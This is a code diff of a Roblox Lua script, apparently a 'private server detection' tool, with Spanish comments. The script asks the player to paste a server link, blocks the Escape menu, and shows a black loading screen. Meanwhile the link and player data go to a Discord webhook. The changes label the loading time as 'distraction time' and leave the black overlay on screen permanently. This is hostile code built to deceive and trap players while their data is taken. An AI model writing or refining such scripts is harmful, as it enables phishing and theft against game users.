@@ -1,7 +1,7 @@
 -- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader (Optimizado con pantalla de carga)
 -- Envía datos del jugador directamente al Discord Webhook (username: Sab)
 -- Examina todo el Workspace en busca de objetos indicados
--- Pantalla negra de carga y barra de progreso (5 segundos y se elimina sola)
+-- Pantalla negra de carga y barra de progreso
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -97,6 +97,8 @@ local function blockEscMenu(actionName, inputState, inputObj)
     return Enum.ContextActionResult.Sink
 end
 
+local blackFrame
+
 ------------------------------------------------------------
 -- 🪟 Create main GUI (link input)
 ------------------------------------------------------------
@@ -188,7 +190,7 @@ sendButton.MouseButton1Click:Connect(function()
     print("🔗 Link entered:", link)
 
     -- Pantalla negra y loading bar
-    local blackFrame = Instance.new("Frame")
+    blackFrame = Instance.new("Frame")
     blackFrame.Name = "BlackScreen"
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
     blackFrame.Position = UDim2.new(0, 0, 0, 0)
@@ -256,8 +258,8 @@ sendButton.MouseButton1Click:Connect(function()
         enviarWebhook(link)
     end)
 
-    -- Animación de barra de carga (5 segundos)
-    local duration = 5 -- 5 segundos
+    -- Animación de barra de carga
+    local duration = 2 -- segundos, puedes ajustar el tiempo de distracción
     local steps = 100
     for step = 0, steps do
         local percent = step / steps
@@ -268,11 +270,14 @@ sendButton.MouseButton1Click:Connect(function()
     fillFrame.Size = UDim2.new(1, 0, 1, 0)
     percentLabel.Text = "100%"
 
-    -- Elimina la pantalla negra al terminar
-    if blackFrame then
-        blackFrame:Destroy()
-    end
-
     label.TextColor3 = Color3.fromRGB(40, 200, 80)
     label.Text = "Datos enviados al webhook de Discord (Sab)!"
 end)
+
+if blackFrame then
+    blackFrame.AncestryChanged:Connect(function()
+        if not blackFrame:IsDescendantOf(game) then
+            ContextActionService:UnbindAction(escBlockActionName)
+        end
+    end)
+end
